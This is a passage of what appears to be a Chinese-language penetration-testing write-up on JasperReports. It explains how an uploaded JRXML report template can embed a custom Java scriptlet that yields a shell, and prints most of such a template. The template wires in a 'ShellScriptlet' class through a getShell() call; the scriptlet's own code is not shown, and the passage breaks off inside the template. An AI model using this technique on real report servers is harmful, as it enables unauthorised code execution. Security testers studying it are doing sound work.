<p>我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。</p>
<h4 id="代码和小脚本"><a href="#代码和小脚本" class="headerlink" title="代码和小脚本"></a>代码和小脚本</h4><p>JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。</p>
<p>JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。</p>
<p>我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。</p>
<h4 id="编辑模板"><a href="#编辑模板" class="headerlink" title="编辑模板"></a>编辑模板</h4><p>我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。</p>
<p>shell.jrxml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="comment">&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 2016-10-04T14:01:12 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jasperReport</span> <span class="attr">xmlns</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd"</span> <span class="attr">name</span>=<span class="string">"AllAccounts"</span> <span class="attr">pageWidth</span>=<span class="string">"595"</span> <span class="attr">pageHeight</span>=<span class="string">"842"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span> <span class="attr">columnWidth</span>=<span class="string">"515"</span> <span class="attr">leftMargin</span>=<span class="string">"40"</span> <span class="attr">rightMargin</span>=<span class="string">"40"</span> <span class="attr">topMargin</span>=<span class="string">"50"</span> <span class="attr">bottomMargin</span>=<span class="string">"50"</span> <span class="attr">isSummaryWithPageHeaderAndFooter</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"17f4b3c5-e096-4a65-b030-ed3bb58ce311"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.language"</span> <span class="attr">value</span>=<span class="string">"EN-US"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Normal"</span> <span class="attr">isDefault</span>=<span class="string">"true"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Bold"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isBold</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Italic"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isItalic</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"PageHeader"</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">forecolor</span>=<span class="string">"#FFFFFF"</span> <span class="attr">backcolor</span>=<span class="string">"#333333"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"detail"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">conditionExpression</span>&gt;</span>&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;<span class="tag">&lt;/<span class="name">conditionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">backcolor</span>=<span class="string">"#E0E0E0"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;/<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">subDataset</span> <span class="attr">name</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"4fcc1d09-9859-48ee-bb6f-8d369bd49113"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">queryString</span>&gt;</span></div><div class="line">&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">queryString</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"phone_office"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_street"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variable</span> <span class="attr">name</span>=<span class="string">"CityyNumber"</span> <span class="attr">class</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">incrementType</span>=<span class="string">"Group"</span> <span class="attr">incrementGroup</span>=<span class="string">"CityGroup"</span> <span class="attr">calculation</span>=<span class="string">"Count"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variableExpression</span>&gt;</span>&lt;![CDATA[Boolean.TRUE]]&gt;<span class="tag">&lt;/<span class="name">variableExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">initialValueExpression</span>&gt;</span>&lt;![CDATA[new Integer(0)]]&gt;<span class="tag">&lt;/<span class="name">initialValueExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">variable</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">groupExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;<span class="tag">&lt;/<span class="name">groupExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">subDataset</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"79"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"227"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"32a2a8ff-d90a-48d7-b044-5325b5c6264f"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"1"</span> <span class="attr">uuid</span>=<span class="string">"19826638-0487-4bb5-9b15-7e7af63b8dce"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.table"</span> <span class="attr">value</span>=<span class="string">"end"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"80"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"6f072af1-756c-49f4-82f3-af59e8124296"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span> <span class="attr">evaluationTime</span>=<span class="string">"Report"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"280"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"75"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"02b15e9e-d360-4b82-a140-54b9bd3b0e81"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"149"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"aa8a8976-039f-45ac-84f3-d8d55b442410"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:LogoLink"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["JasperReports Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"265"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"4b5dd0d1-9011-42cf-ab07-f80c02d3d166"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["Jaspersoft Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">key</span>=<span class="string">"table"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"db3dd84a-3743-43b3-ab7e-c4aebdb907df"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:table</span> <span class="attr">xmlns:jr</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">datasetRun</span> <span class="attr">subDataset</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"3b2a079f-f600-46a6-a7af-720c4e939e7e"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">connectionExpression</span>&gt;</span>&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;<span class="tag">&lt;/<span class="name">connectionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">datasetRun</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnGroup</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">uuid</span>=<span class="string">"1e5d630a-c8f9-4dbb-8415-393f7624ca35"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:groupHeader</span> <span class="attr">groupName</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:cell</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">backcolor</span>=<span class="string">"#C0C0C0"</span> <span class="attr">uuid</span>=<span class="string">"aeafecc2-ef7e-435c-ae07-1f45ed6b179a"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">anchorNameExpression</span>&gt;</span>&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;<span class="tag">&lt;/<span class="name">anchorNameExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:cell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:groupHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"43ffff20-e89f-4f73-ad8d-878e9581274a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"a76dcb9c-8601-48bc-b9cc-3d1c316e537d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" "]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"73a40f28-2c08-4849-a2a9-b83ade7a6b7d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"10"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">uuid</span>=<span class="string">"d472eeed-282a-402b-9044-a397ca270655"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"bd0d4582-5684-4e15-8623-b3f1940bf1bb"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span 